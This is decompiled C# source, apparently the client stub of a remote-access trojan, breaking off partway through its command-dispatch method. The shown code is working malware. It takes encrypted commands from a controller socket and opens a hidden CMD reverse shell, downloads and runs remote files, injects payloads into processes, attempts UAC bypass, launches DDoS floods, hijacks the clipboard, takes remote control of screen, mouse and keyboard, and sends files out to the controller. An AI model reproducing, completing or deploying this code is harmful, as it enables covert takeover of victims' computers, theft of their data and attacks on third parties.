using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;

namespace Stub
{
	// Token: 0x0200000A RID: 10
	public class Messages
	{
		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000023 RID: 35 RVA: 0x00002A5C File Offset: 0x00000C5C
		// (set) Token: 0x06000024 RID: 36 RVA: 0x00002A74 File Offset: 0x00000C74
		private static Process MyProcess
		{
			get
			{
				return Messages._MyProcess;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				DataReceivedEventHandler value2 = new DataReceivedEventHandler(Messages.MyProcess_OutputDataReceived);
				DataReceivedEventHandler value3 = new DataReceivedEventHandler(Messages.MyProcess_ErrorDataReceived);
				if (Messages._MyProcess != null)
				{
					Messages._MyProcess.OutputDataReceived -= value2;
					Messages._MyProcess.ErrorDataReceived -= value3;
				}
				Messages._MyProcess = value;
				if (Messages._MyProcess != null)
				{
					Messages._MyProcess.OutputDataReceived += value2;
					Messages._MyProcess.ErrorDataReceived += value3;
				}
			}
		}

		// Token: 0x06000025 RID: 37 RVA: 0x00002ADC File Offset: 0x00000CDC
		public static void AppendOutputText(string text)
		{
			try
			{
				Messages.AppendOutputTextDelegate appendOutputTextDelegate = new Messages.AppendOutputTextDelegate(Messages.AppendOutputText);
				ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("R/", Messages.SPL), text), Messages.SPL), Helper.ID())));
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000026 RID: 38 RVA: 0x00002B4C File Offset: 0x00000D4C
		private static void MyProcess_ErrorDataReceived(object sender, DataReceivedEventArgs e)
		{
			Messages.AppendOutputText("\r\nError: " + e.Data + "\r\n");
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00002B68 File Offset: 0x00000D68
		private static void MyProcess_OutputDataReceived(object sender, DataReceivedEventArgs e)
		{
			Messages.AppendOutputText("\r\n" + e.Data);
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00002B80 File Offset: 0x00000D80
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		public static void Read(byte[] b)
		{
			try
			{
				string[] A = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Conversions.ToString(Messages.SPL), -1, CompareMethod.Binary);
				string left = A[0];
				if (Operators.CompareString(left, "rec", false) == 0)
				{
					Helper.CloseMutex();
					Application.Restart();
					Environment.Exit(0);
				}
				else if (Operators.CompareString(left, "CLOSE", false) == 0)
				{
					ClientSocket.S.Shutdown(SocketShutdown.Both);
					ClientSocket.S.Close();
					Environment.Exit(0);
				}
				else if (Operators.CompareString(left, "uninstall", false) == 0)
				{
					Settings.USBS.stopp();
					object instance = Helper.objj(A[1]);
					Type type = null;
					string memberName = "un";
					object[] array = new object[]
					{
						Settings.nameee
					};
					object[] arguments = array;
					string[] argumentNames = null;
					Type[] typeArguments = null;
					bool[] array2 = new bool[]
					{
						true
					};
					NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array2, true);
					if (array2[0])
					{
						Settings.nameee = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "update", false) == 0)
				{
					object instance2 = Helper.objj(A[1]);
					Type type2 = null;
					string memberName2 = "update";
					object[] array = new object[3];
					array[0] = Settings.nameee;
					object[] array3 = array;
					int num = 1;
					string[] $VB$Local_A = A;
					string[] array4 = $VB$Local_A;
					int num2 = 2;
					array3[num] = array4[num2];
					object[] array5 = array;
					int num3 = 2;
					string[] $VB$Local_A2 = A;
					string[] array6 = $VB$Local_A2;
					int num4 = 3;
					array5[num3] = array6[num4];
					object[] array7 = array;
					object[] arguments2 = array7;
					string[] argumentNames2 = null;
					Type[] typeArguments2 = null;
					bool[] array2 = new bool[]
					{
						true,
						true,
						true
					};
					NewLateBinding.LateCall(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array2, true);
					if (array2[0])
					{
						Settings.nameee = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					if (array2[1])
					{
						$VB$Local_A[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
					if (array2[2])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[2]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "DW", false) == 0)
				{
					Messages.Download(A[1], A[2]);
				}
				else if (Operators.CompareString(left, "RD-", false) == 0)
				{
					object instance3 = Screen.PrimaryScreen.Bounds.Size;
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("RD-", Messages.SPL), NewLateBinding.LateGet(instance3, null, "Width", new object[0], null, null, null)), Messages.SPL), NewLateBinding.LateGet(instance3, null, "Height", new object[0], null, null, null)), Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "RD+", false) == 0)
				{
					RemoteDesktop.Capture(Conversions.ToInteger(A[1]), Conversions.ToInteger(A[2]), Conversions.ToInteger(A[3]));
				}
				else if (Operators.CompareString(left, "###", false) == 0)
				{
					Point position = new Point(Conversions.ToInteger(A[1]), Conversions.ToInteger(A[2]));
					Cursor.Position = position;
					Messages.mouse_event(Conversions.ToInteger(A[3]), 0, 0, 0, 1);
				}
				else if (Operators.CompareString(left, "$$$", false) == 0)
				{
					Point position = new Point(Conversions.ToInteger(A[1]), Conversions.ToInteger(A[2]));
					Cursor.Position = position;
				}
				else if (Operators.CompareString(left, "^^^&", false) == 0)
				{
					bool flag = Convert.ToBoolean(A[2]);
					byte bVk = Convert.ToByte(A[1]);
					Messages.keybd_event(bVk, 0, flag ? 0U : 2U, UIntPtr.Zero);
				}
				else if (Operators.CompareString(left, "FM", false) == 0)
				{
					Thread thread = new Thread(delegate()
					{
						NewLateBinding.LateCall(Helper.objj(A[1]), null, "Memory", new object[]
						{
							RuntimeHelpers.GetObjectValue(Helper.frombase64(A[2]))
						}, null, null, null, true);
					});
					thread.Start();
					GC.Collect();
				}
				else if (Operators.CompareString(left, "LN", false) == 0)
				{
					string fileName = Path.GetTempFileName() + "-" + A[1];
					WebClient webClient = new WebClient();
					webClient.DownloadFile(A[2], fileName);
					Process.Start(fileName);
					GC.Collect();
				}
				else if (Operators.CompareString(left, "getinfo", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("getinfo", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "Xinfo", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("Xinfo", Messages.SPL), NewLateBinding.LateGet(Helper.objj(A[1]), null, "gett", new object[0], null, null, null)), Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "url", false) == 0)
				{
					Process.Start(A[1]);
				}
				else if (Operators.CompareString(left, "openhide", false) == 0)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("internetexplorer.application", ""));
					object instance4 = objectValue;
					Type type3 = null;
					string memberName3 = "navigate";
					object[] array = new object[1];
					object[] array8 = array;
					int num5 = 0;
					string[] $VB$Local_A2 = A;
					string[] array9 = $VB$Local_A2;
					int num4 = 1;
					array8[num5] = array9[num4];
					object[] array7 = array;
					object[] arguments3 = array7;
					string[] argumentNames3 = null;
					Type[] typeArguments3 = null;
					bool[] array2 = new bool[]
					{
						true
					};
					NewLateBinding.LateCall(instance4, type3, memberName3, arguments3, argumentNames3, typeArguments3, array2, true);
					if (array2[0])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					NewLateBinding.LateSet(objectValue, null, "visible", new object[]
					{
						0
					}, null, null);
				}
				else if (Operators.CompareString(left, "shellfuc", false) == 0)
				{
					Interaction.Shell(A[1], AppWinStyle.Hide, false, -1);
				}
				else if (Operators.CompareString(left, "regfuc", false) == 0)
				{
					object instance5 = Interaction.CreateObject("WScript.Shell", "");
					Type type4 = null;
					string memberName4 = "RegWrite";
					object[] array = new object[3];
					object[] array10 = array;
					int num6 = 0;
					string[] $VB$Local_A2 = A;
					string[] array11 = $VB$Local_A2;
					int num4 = 1;
					array10[num6] = array11[num4];
					array[1] = Convert.ToInt32(A[2]);
					array[2] = "REG_DWORD";
					object[] array7 = array;
					object[] arguments4 = array7;
					string[] argumentNames4 = null;
					Type[] typeArguments4 = null;
					bool[] array2 = new bool[]
					{
						true,
						false,
						false
					};
					NewLateBinding.LateCall(instance5, type4, memberName4, arguments4, argumentNames4, typeArguments4, array2, true);
					if (array2[0])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "bot", false) == 0)
				{
					object instance6 = Helper.objj(A[1]);
					Type type5 = null;
					string memberName5 = "RunBotKiller";
					object[] array7 = new object[]
					{
						Settings.path2
					};
					object[] arguments5 = array7;
					string[] argumentNames5 = null;
					Type[] typeArguments5 = null;
					bool[] array2 = new bool[]
					{
						true
					};
					NewLateBinding.LateCall(instance6, type5, memberName5, arguments5, argumentNames5, typeArguments5, array2, true);
					if (array2[0])
					{
						Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "admin", false) == 0)
				{
					NewLateBinding.LateCall(Helper.objj(A[1]), null, "uac", new object[0], null, null, null, true);
				}
				else if (Operators.CompareString(left, "bypss", false) == 0)
				{
					object instance7 = Helper.objj(A[1]);
					Type type6 = null;
					string memberName6 = "calluac";
					object[] array7 = new object[]
					{
						Settings.path2
					};
					object[] arguments6 = array7;
					string[] argumentNames6 = null;
					Type[] typeArguments6 = null;
					bool[] array2 = new bool[]
					{
						true
					};
					NewLateBinding.LateCall(instance7, type6, memberName6, arguments6, argumentNames6, typeArguments6, array2, true);
					if (array2[0])
					{
						Settings.path2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "script", false) == 0)
				{
					object instance8 = Helper.objj(A[1]);
					Type type7 = null;
					string memberName7 = "exc";
					object[] array = new object[2];
					object[] array12 = array;
					int num7 = 0;
					string[] $VB$Local_A2 = A;
					string[] array13 = $VB$Local_A2;
					int num4 = 2;
					array12[num7] = array13[num4];
					object[] array14 = array;
					int num8 = 1;
					string[] $VB$Local_A = A;
					string[] array15 = $VB$Local_A;
					int num2 = 3;
					array14[num8] = array15[num2];
					object[] array7 = array;
					object[] arguments7 = array7;
					string[] argumentNames7 = null;
					Type[] typeArguments7 = null;
					bool[] array2 = new bool[]
					{
						true,
						true
					};
					NewLateBinding.LateCall(instance8, type7, memberName7, arguments7, argumentNames7, typeArguments7, array2, true);
					if (array2[0])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					if (array2[1])
					{
						$VB$Local_A[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "DDosS", false) == 0)
				{
					if (Operators.CompareString(Settings.dosstu, "!", false) != 0)
					{
						Settings.doshost = A[1];
						Settings.dosport = A[2];
						Settings.dostype = A[3];
						if (Operators.CompareString(Settings.dostype, "UDP", false) == 0)
						{
							Settings.dTimer2.Interval = 100.0;
						}
						if (Operators.CompareString(Settings.dostype, "TCP", false) == 0)
						{
							Settings.dTimer2.Interval = 1.0;
						}
						Settings.dTimer2.Start();
						Settings.dosstu = "!";
					}
				}
				else if (Operators.CompareString(left, "DDosT", false) == 0)
				{
					Settings.dTimer2.Stop();
					Settings.dosstu = null;
					Settings.doshost = null;
					Settings.dosport = null;
					Settings.dostype = null;
				}
				else if (Operators.CompareString(left, "Cilpper", false) == 0)
				{
					Thread thread2 = new Thread(delegate()
					{
						object instance28 = Helper.objj(A[1]);
						Type type27 = null;
						string memberName27 = "Clipper";
						object[] array62 = new object[2];
						object[] array63 = array62;
						int num32 = 0;
						string[] $VB$Local_A5 = A;
						string[] array64 = $VB$Local_A5;
						int num33 = 2;
						array63[num32] = array64[num33];
						object[] array65 = array62;
						int num34 = 1;
						string[] $VB$Local_A6 = A;
						string[] array66 = $VB$Local_A6;
						int num35 = 3;
						array65[num34] = array66[num35];
						object[] array67 = array62;
						object[] arguments27 = array67;
						string[] argumentNames27 = null;
						Type[] typeArguments27 = null;
						bool[] array68 = new bool[]
						{
							true,
							true
						};
						NewLateBinding.LateCall(instance28, type27, memberName27, arguments27, argumentNames27, typeArguments27, array68, true);
						if (array68[0])
						{
							$VB$Local_A5[num33] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array67[0]), typeof(string));
						}
						if (array68[1])
						{
							$VB$Local_A6[num35] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array67[1]), typeof(string));
						}
					});
					thread2.Start();
					GC.Collect();
				}
				else if (Operators.CompareString(left, "PE", false) == 0)
				{
					if (File.Exists(A[2]))
					{
						object instance9 = Helper.objj(A[1]);
						Type type8 = null;
						string memberName8 = "injRun";
						object[] array = new object[2];
						object[] array16 = array;
						int num9 = 0;
						string[] $VB$Local_A2 = A;
						string[] array17 = $VB$Local_A2;
						int num4 = 2;
						array16[num9] = array17[num4];
						array[1] = RuntimeHelpers.GetObjectValue(Helper.frombase64(A[3]));
						object[] array7 = array;
						object[] arguments8 = array7;
						string[] argumentNames8 = null;
						Type[] typeArguments8 = null;
						bool[] array2 = new bool[]
						{
							true,
							false
						};
						NewLateBinding.LateCall(instance9, type8, memberName8, arguments8, argumentNames8, typeArguments8, array2, true);
						if (array2[0])
						{
							$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
						}
					}
				}
				else if (Operators.CompareString(left, "vbb", false) == 0)
				{
					object instance10 = Helper.objj(A[1]);
					Type type9 = null;
					string memberName9 = "CallV";
					object[] array = new object[2];
					object[] array18 = array;
					int num10 = 0;
					string[] $VB$Local_A2 = A;
					string[] array19 = $VB$Local_A2;
					int num4 = 2;
					array18[num10] = array19[num4];
					object[] array20 = array;
					int num11 = 1;
					string[] $VB$Local_A = A;
					string[] array21 = $VB$Local_A;
					int num2 = 3;
					array20[num11] = array21[num2];
					object[] array7 = array;
					object[] arguments9 = array7;
					string[] argumentNames9 = null;
					Type[] typeArguments9 = null;
					bool[] array2 = new bool[]
					{
						true,
						true
					};
					NewLateBinding.LateCall(instance10, type9, memberName9, arguments9, argumentNames9, typeArguments9, array2, true);
					if (array2[0])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
					if (array2[1])
					{
						$VB$Local_A[num2] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[1]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "PSleep", false) == 0)
				{
					Thread thread3 = new Thread(delegate()
					{
						NewLateBinding.LateCall(Helper.objj(A[1]), null, "PreventSleep", new object[0], null, null, null, true);
					});
					thread3.Start();
					GC.Collect();
				}
				else if (Operators.CompareString(left, "xxx", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("xxx", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "R/", false) == 0)
				{
					try
					{
						try
						{
							using (Process process = new Process())
							{
								process.StartInfo.FileName = "taskkill.exe";
								process.StartInfo.Arguments = " /pid " + Conversions.ToString(Messages.processid) + " /f";
								process.StartInfo.UseShellExecute = false;
								process.StartInfo.RedirectStandardError = false;
								process.StartInfo.RedirectStandardOutput = false;
								process.StartInfo.CreateNoWindow = true;
								process.Start();
								process.WaitForExit();
							}
						}
						catch (Exception ex)
						{
						}
						Messages.MyProcess = new Process();
						ProcessStartInfo startInfo = Messages.MyProcess.StartInfo;
						startInfo.FileName = "CMD.EXE";
						startInfo.UseShellExecute = false;
						startInfo.CreateNoWindow = true;
						startInfo.RedirectStandardInput = true;
						startInfo.RedirectStandardOutput = true;
						startInfo.RedirectStandardError = true;
						Messages.MyProcess.Start();
						Messages.processid = Messages.MyProcess.Id;
						Messages.MyProcess.BeginErrorReadLine();
						Messages.MyProcess.BeginOutputReadLine();
						Messages.AppendOutputText("Process Started at: " + Messages.MyProcess.StartTime.ToString());
					}
					catch (Exception ex2)
					{
					}
				}
				else if (Operators.CompareString(left, "runnnnnn", false) == 0)
				{
					Messages.MyProcess.StandardInput.WriteLine(A[1]);
					Messages.MyProcess.StandardInput.Flush();
				}
				else if (Operators.CompareString(left, "closeshell", false) == 0)
				{
					Messages.MyProcess.StandardInput.WriteLine("EXIT");
					Messages.MyProcess.StandardInput.Flush();
					Messages.MyProcess.Close();
				}
				else if (Operators.CompareString(left, "ppp", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("ppp", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "R#", false) == 0)
				{
					string text = null;
					foreach (Process process2 in Process.GetProcesses())
					{
						try
						{
							text = string.Concat(new string[]
							{
								text,
								Path.GetFileNameWithoutExtension(process2.ProcessName),
								Path.GetExtension(process2.MainModule.FileName.ToString()),
								"|+++|",
								Conversions.ToString(process2.Id),
								"|+++|",
								process2.MainModule.FileName.ToString(),
								"*+*"
							});
						}
						catch (Exception ex3)
						{
						}
					}
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("R#", Messages.SPL), text), Messages.SPL), Operators.AddObject(Operators.AddObject(Process.GetCurrentProcess().MainModule.FileName.ToString(), Messages.SPL), Helper.ID()))));
				}
				else if (Operators.CompareString(left, "kill", false) == 0)
				{
					Process.GetProcessById(Conversions.ToInteger(A[1])).Kill();
				}
				else if (Operators.CompareString(left, "kD", false) == 0)
				{
					Process.GetProcessById(Conversions.ToInteger(A[1])).Kill();
					Thread.Sleep(500);
					File.Delete(A[2]);
				}
				else if (Operators.CompareString(left, "RST", false) == 0)
				{
					Process.GetProcessById(Conversions.ToInteger(A[1])).Kill();
					Thread.Sleep(500);
					Process.Start(A[2]);
				}
				else if (Operators.CompareString(left, "cbb", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("cbb", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "R$", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("R$", Messages.SPL), NewLateBinding.LateGet(Helper.objj(A[1]), null, "GetText", new object[0], null, null, null)), Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "SETT", false) == 0)
				{
					object instance11 = Helper.objj(A[1]);
					Type type10 = null;
					string memberName10 = "setText";
					object[] array = new object[1];
					object[] array22 = array;
					int num12 = 0;
					string[] $VB$Local_A2 = A;
					string[] array23 = $VB$Local_A2;
					int num4 = 2;
					array22[num12] = array23[num4];
					object[] array7 = array;
					object[] arguments10 = array7;
					string[] argumentNames10 = null;
					Type[] typeArguments10 = null;
					bool[] array2 = new bool[]
					{
						true
					};
					NewLateBinding.LateCall(instance11, type10, memberName10, arguments10, argumentNames10, typeArguments10, array2, true);
					if (array2[0])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "clss", false) == 0)
				{
					NewLateBinding.LateCall(Helper.objj(A[1]), null, "clearr", new object[0], null, null, null, true);
				}
				else if (Operators.CompareString(left, "BSOD", false) == 0)
				{
					NewLateBinding.LateCall(Helper.objj(A[1]), null, "BSOD", new object[0], null, null, null, true);
				}
				else if (Operators.CompareString(left, "BScreen", false) == 0)
				{
					NewLateBinding.LateCall(Helper.objj(A[1]), null, "Blank", new object[]
					{
						Convert.ToInt32(A[2])
					}, null, null, null, true);
				}
				else if (Operators.CompareString(left, "InsW", false) == 0)
				{
					NewLateBinding.LateCall(Helper.objj(A[1]), null, "INSS", new object[]
					{
						Convert.ToInt32(A[2])
					}, null, null, null, true);
				}
				else if (Operators.CompareString(left, "|||", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("|||", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "GetDrives", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("FileManager", Messages.SPL), Helper.ID()), Messages.SPL), Messages.getDrives())));
				}
				else if (Operators.CompareString(left, "FileManager", false) == 0)
				{
					try
					{
						ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("FileManager", Messages.SPL), Helper.ID()), Messages.SPL), Messages.getFolders(A[1])), Messages.getFiles(A[1]))));
					}
					catch (Exception ex4)
					{
						ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("FileManager", Messages.SPL), Helper.ID()), Messages.SPL), "Error")));
					}
				}
				else if (Operators.CompareString(left, "Delete", false) == 0)
				{
					string left2 = A[1];
					if (Operators.CompareString(left2, "Folder", false) == 0)
					{
						Directory.Delete(A[2], true);
					}
					else if (Operators.CompareString(left2, "File", false) == 0)
					{
						File.Delete(A[2]);
					}
				}
				else if (Operators.CompareString(left, "Execute", false) == 0)
				{
					Process.Start(A[1]);
				}
				else if (Operators.CompareString(left, "Rename", false) == 0)
				{
					string left3 = A[1];
					if (Operators.CompareString(left3, "Folder", false) == 0)
					{
						MyProject.Computer.FileSystem.RenameDirectory(A[2], A[3]);
					}
					else if (Operators.CompareString(left3, "File", false) == 0)
					{
						MyProject.Computer.FileSystem.RenameFile(A[2], A[3]);
					}
				}
				else if (Operators.CompareString(left, "tss", false) == 0)
				{
					string right = MyProject.Computer.FileSystem.ReadAllText(A[1]);
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("txtttt", Messages.SPL), Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Helper.ID(), Messages.SPL), right), Messages.SPL), A[1]))));
				}
				else if (Operators.CompareString(left, "sedit", false) == 0)
				{
					StreamWriter streamWriter = new StreamWriter(A[1], false);
					streamWriter.WriteLine(A[2]);
					streamWriter.Close();
				}
				else if (Operators.CompareString(left, "viewimage", false) == 0)
				{
					byte[] input;
					try
					{
						input = Helper.SB(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject("viewimage", Messages.SPL), Helper.ID()), ClientSocket.SPL), Helper.BS(Messages.compress((Bitmap)Image.FromFile(A[1]), Conversions.ToInteger(A[2]))))));
					}
					catch (Exception ex5)
					{
						return;
					}
					try
					{
						Socket s = ClientSocket.S;
						lock (s)
						{
							using (MemoryStream memoryStream = new MemoryStream())
							{
								byte[] array24 = Helper.AES_Encryptor(input);
								byte[] array25 = Helper.SB(Conversions.ToString(array24.Length) + "\0");
								memoryStream.Write(array25, 0, array25.Length);
								memoryStream.Write(array24, 0, array24.Length);
								ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
								ClientSocket.S.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
								GC.Collect();
							}
						}
					}
					catch (Exception ex6)
					{
						ClientSocket.isConnected = false;
					}
				}
				else if (Operators.CompareString(left, "hidefolderfile", false) == 0)
				{
					FileAttribute attributes = FileAttribute.Hidden;
					FileSystem.SetAttr(A[1], attributes);
				}
				else if (Operators.CompareString(left, "showfolderfile", false) == 0)
				{
					FileAttribute attributes2 = FileAttribute.Normal;
					FileSystem.SetAttr(A[1], attributes2);
				}
				else if (Operators.CompareString(left, "creatnewfolder", false) == 0)
				{
					MyProject.Computer.FileSystem.CreateDirectory(A[1]);
					Thread.Sleep(500);
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("RL", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "creatfile", false) == 0)
				{
					File.Create(A[1]).Dispose();
					Thread.Sleep(500);
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("RL", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "downloadfile", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("downloadedfile", Messages.SPL), Convert.ToBase64String(File.ReadAllBytes(A[1]))), Messages.SPL), A[2]), Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "sendfileto", false) == 0)
				{
					File.WriteAllBytes(A[1], Convert.FromBase64String(A[2]));
					GC.Collect();
				}
				else if (Operators.CompareString(left, "WL", false) == 0)
				{
					object instance12 = Helper.objj(A[1]);
					Type type11 = null;
					string memberName11 = "WL";
					object[] array = new object[1];
					object[] array26 = array;
					int num13 = 0;
					string[] $VB$Local_A2 = A;
					string[] array27 = $VB$Local_A2;
					int num4 = 2;
					array26[num13] = array27[num4];
					object[] array7 = array;
					object[] arguments11 = array7;
					string[] argumentNames11 = null;
					Type[] typeArguments11 = null;
					bool[] array2 = new bool[]
					{
						true
					};
					NewLateBinding.LateCall(instance12, type11, memberName11, arguments11, argumentNames11, typeArguments11, array2, true);
					if (array2[0])
					{
						$VB$Local_A2[num4] = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
					}
				}
				else if (Operators.CompareString(left, "DelP", false) == 0)
				{
					NewLateBinding.LateCall(Helper.objj(A[1]), null, "del", new object[0], null, null, null, true);
				}
				else if (Operators.CompareString(left, "7zIT", false) == 0)
				{
					NewLateBinding.LateCall(Helper.objj(A[1]), null, "install", new object[0], null, null, null, true);
				}
				else if (Operators.CompareString(left, "NETINS", false) == 0)
				{
					if (Messages.Net3 != 1)
					{
						Messages.Net3 = 1;
						NewLateBinding.LateCall(Helper.objj(A[1]), null, "install", new object[0], null, null, null, true);
					}
				}
				else if (Operators.CompareString(left, "7zzip", false) == 0)
				{
					Interaction.Shell(Path.GetTempPath() + "7zip\\7z.exe" + A[1], AppWinStyle.Hide, false, -1);
				}
				else if (Operators.CompareString(left, "CPP", false) == 0)
				{
					foreach (string value in Strings.Split(A[1], "|", -1, CompareMethod.Binary))
					{
						try
						{
							if (File.Exists(Conversions.ToString(value)))
							{
								File.Copy(Conversions.ToString(value), A[2] + Path.GetFileName(Conversions.ToString(value)));
							}
							if (Directory.Exists(Conversions.ToString(value)))
							{
								MyProject.Computer.FileSystem.CopyDirectory(Conversions.ToString(value), A[2] + Path.GetFileName(Conversions.ToString(value)), true);
							}
						}
						catch (Exception ex7)
						{
						}
					}
					Thread.Sleep(500);
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("RL", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "CTT", false) == 0)
				{
					foreach (string value2 in Strings.Split(A[1], "|", -1, CompareMethod.Binary))
					{
						try
						{
							if (File.Exists(Conversions.ToString(value2)))
							{
								File.Move(Conversions.ToString(value2), A[2] + Path.GetFileName(Conversions.ToString(value2)));
							}
							if (Directory.Exists(Conversions.ToString(value2)))
							{
								MyProject.Computer.FileSystem.MoveDirectory(Conversions.ToString(value2), A[2] + Path.GetFileName(Conversions.ToString(value2)), true);
							}
						}
						catch (Exception ex8)
						{
						}
					}
					Thread.Sleep(500);
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("RL", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "PRG", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.AddObject(Operators.AddObject("PRG", Messages.SPL), Helper.ID())));
				}
				else if (Operators.CompareString(left, "P@", false) == 0)
				{
					ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("P@", Messages.SPL), Operators.AddObject(Operators.AddObject(NewLateBinding.LateGet(Helper.objj(A[1]), null, "InsProg", new object[0], null, null, null), Messages.SPL), Helper.ID()))));
				}
				else if (Operators.CompareString(left, "UNS", false) == 0)
				{
					Interaction.Shell(A[1], AppWinStyle.NormalFocus, false, -1);
				}
				else if (Operators.CompareString(left, "RSS", false) == 0)
				{
					object instance13 = Helper.objj(A[1]);
					Type type12 = null;
					string memberName12 = "Run";
					object[] array = new object[1];
					object[] array30 = array;
					int num14 = 0;
					string[] $VB$Local_A2 = A;
					string[] array31 = $VB$Local_A2;
					int num4 = 2;
					array30[num14] = array31[num4];
					object[] array7 = array;
					object[] arguments12 = array7;
					string[] argumentNames12 = null;
					Type[] typeArguments12 = null;
					bool[] array2 = new bool[]
					{
						true
					};
					NewLateBinding.LateCall(instance13, type12, memberName12, arguments12, argumentNames12, typeArguments12, array2, true);
					if (array2[0])
					{
